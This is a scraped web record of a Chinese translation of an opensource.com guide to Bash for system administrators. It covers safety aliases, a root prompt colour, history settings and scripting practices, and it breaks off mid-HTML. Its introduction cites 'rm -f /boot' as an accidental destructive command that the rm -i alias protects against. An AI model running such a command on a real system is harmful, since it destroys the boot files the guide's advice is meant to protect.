data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"title": "面向系统管理员的 Bash 指南", "url": "http://blog.jobbole.com/114280/", "create_date": "2018/08/19", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/1150173c490f522abf51bb0af9fc028d.jpg"], "url_object_id": "7ccb93ad7c6447b0eab796e13841bb38", "praise_nums": 2, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,Bash,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/7/admin-guide-bash\">Maxim Burgerhout</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9919-1.html\">Linux中国/Liang Chen</a>   </div><blockquote><p>使 Bash 工作的更好的技巧。</p></blockquote>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/1150173c490f522abf51bb0af9fc028d.jpg\"></p>\n<p>每个行业都有一个该行业的大师们最常使用的工具。 对于许多系统管理员来说，这个工具就是他们的 <a href=\"http://www.catb.org/jargon/html/S/shell.html\">shell</a>。 在大多数 Linux 和其他类 Unix 系统上，默认的 shell 是 Bash。</p>\n<p>Bash 是一个相当古老的程序——它起源于 20 世纪 80 年代后期——但它建立在更多更老的 shell 上，比如 C shell（csh），csh 至少是它 10 年前的前辈了。 因为 shell 的概念是那么古老，所以有大量的神秘知识等待着系统管理员去吸收领悟，使其生活更轻松。</p>\n<p>我们来看看一些基础知识。</p>\n<p>在某些时候，谁曾经无意中以 root 身份运行命令并导致某种问题？ <em>举手</em></p>\n<p>我很确定我们很多人一度都是那个人。 这很痛苦。 这里有一些非常简单的技巧可以防止你再次碰上这类问题。</p>\n<h3 id=\"toc_1\">使用别名</h3>\n<p>首先，为 <code>mv</code> 和 <code>rm</code> 等命令设置别名，指向 <code>mv -i</code> 和 <code>rm -i</code>。 这将确保在运行 <code>rm -f /boot</code> 时至少需要你确认。 在 Red Hat 企业版 Linux 中，如果你使用 root 帐户，则默认设置这些别名。</p>\n<p>如果你还要为普通用户帐户设置这些别名，只需将这两行放入家目录下名为 <code>.bashrc</code> 的文件中（这些也适用于 <code>sudo</code> ）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6dfef518905874\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias mv='mv -i'\r\nalias rm='rm -i'</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6dfef518905874-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6dfef518905874-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6dfef518905874-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">mv</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'mv -i'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6dfef518905874-2\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">rm</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rm -i'</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">让你的 root 提示符脱颖而出</h3>\n<p>你可以采取的防止意外发生的另一项措施是确保你很清楚在使用 root 帐户。 在日常工作中，我通常会让 root 提示符从日常使用的提示符中脱颖而出。</p>\n<p>如果将以下内容放入 root 的家目录中的 <code>.bashrc</code> 文件中，你将看到一个黑色背景上的红色的 root 提示符，清楚地表明你（或其他任何人）应该谨慎行事。</p>\n<blockquote><p>export PS1=”</p><p style=\"text-align:center;\"><span class=\"MathJax_Preview\">\\[$(tput bold)$(tput setab 0)$(tput setaf 1)\\]</span></p>\\u@\\h:\\w # <p style=\"text-align:center;\"><span class=\"MathJax_Preview\">\\[$(tput sgr0)\\]</span></p>”</blockquote>\n<p>实际上，你应该尽可能避免以 root 用户身份登录，而是通过 <code>sudo</code> 运行大多数系统管理命令，但这是另一回事。</p>\n<p>使用了一些小技巧用于防止使用 root 帐户时的“不小心的副作用”之后，让我们看看 Bash 可以帮助你在日常工作中做的一些好事。</p>\n<h3 id=\"toc_3\">控制你的历史</h3>\n<p>你可能知道在 Bash 中你按向上的箭头时能看见和重新使用你之前所有（好吧，大多数）的命令。这是因为这些命令已经保存到了你家目录下的名为 <code>.bash_history</code> 的文件中。这个历史文件附带了一组有用的设置和命令。</p>\n<p>首先，你可以通过键入 <code>history</code> 来查看整个最近的命令历史记录，或者你可以通过键入 <code>history 30</code> 将其限制为最近 30 个命令。不过这技巧太平淡无奇了（LCTT 译注： vanilla 原为香草，后引申没拓展的、标准、普通的，比如 vanilla C++ compiler 意为标准 C++ 编译器）。 你可以更好地控制 Bash 保存的内容以及保存方式。</p>\n<p>例如，如果将以下内容添加到 <code>.bashrc</code>，那么任何以空格开头的命令都不会保存到历史记录列表中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6dff9544372552\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHISTCONTROL=ignorespace</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6dff9544372552-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6dff9544372552-1\"><span class=\"crayon-v\">HISTCONTROL</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">ignorespace</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你需要以明文形式将密码传递给一个命令，这就非常有用。 （是的，这太可怕了，但它仍然会发生。）</p>\n<p>如果你不希望经常执行的命令充斥在历史记录中，请使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6dffd980122572\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHISTCONTROL=ignorespace:erasedups</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6dffd980122572-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6dffd980122572-1\"><span class=\"crayon-v\">HISTCONTROL</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">ignorespace</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">erasedups</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这样，每次使用一个命令时，都会从历史记录文件中删除之前出现的所有相同命令，并且只将最后一次调用保存到历史记录列表中。</p>\n<p>我特别喜欢的历史记录设置是 <code>HISTTIMEFORMAT</code> 设置。 这将在历史记录文件中在所有的条目前面添加上时间戳。 例如，我使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e001373585539\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHISTTIMEFORMAT=\"%F %T  \"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e001373585539-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e001373585539-1\"><span class=\"crayon-v\">HISTTIMEFORMAT</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"%F %T  \"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>当我输入 <code>history 5</code> 时，我得到了很好的完整信息，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e006040831987\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n1009  2018-06-11 22:34:38  cat /etc/hosts\r\n1010  2018-06-11 22:34:40  echo $foo\r\n1011  2018-06-11 22:34:42  echo $bar\r\n1012  2018-06-11 22:34:44  ssh myhost\r\n1013  2018-06-11 22:34:55  vim .bashrc</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e006040831987-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e006040831987-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e006040831987-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e006040831987-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e006040831987-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e006040831987-1\"><span class=\"crayon-cn\">1009</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38</span><span class=\"crayon-h\"> </span> <span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">hosts</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e006040831987-2\"><span class=\"crayon-cn\">1010</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">40</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">foo</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f6e006040831987-3\"><span class=\"crayon-cn\">1011</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">bar</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e006040831987-4\"><span class=\"crayon-cn\">1012</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">44</span><span class=\"crayon-h\"> </span> <span class=\"crayon-e\">ssh </span><span class=\"crayon-i\">myhost</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f6e006040831987-5\"><span class=\"crayon-cn\">1013</span><span class=\"crayon-h\"> </span> <span class=\"crayon-cn\">2018</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">06</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">34</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">55</span><span class=\"crayon-h\"> </span> <span class=\"crayon-i\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bashrc</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>这使我更容易浏览我的命令历史记录并找到我两天前用来建立到我家实验室的 SSH 连接（我一次又一次地忘记……）。</p>\n<h3 id=\"toc_4\">Bash 最佳实践</h3>\n<p>我将在编写 Bash 脚本时最好的（或者至少是好的，我不要求无所不知）11 项实践列出来。</p>\n<p>11、 Bash 脚本可能变得复杂，不过注释也很方便。 如果你在考虑是否要添加注释，那就添加一个注释。 如果你在周末之后回来并且不得不花时间搞清楚你上周五想要做什么，那你是忘了添加注释。</p>\n<p>10、 用花括号括起所有变量名，比如 <code>${myvariable}</code>。 养成这个习惯可以使用 <code>${variable}_suffix</code> 这种用法了，还能提高整个脚本的一致性。</p>\n<p>9、 计算表达式时不要使用反引号；请改用 <code>$()</code> 语法。 所以使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e00b399013443\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor  file in $(ls); do</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e00b399013443-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e00b399013443-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span> <span class=\"crayon-e\">file </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ls</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>而不使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e00e226190748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfor  file in `ls`; do</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div 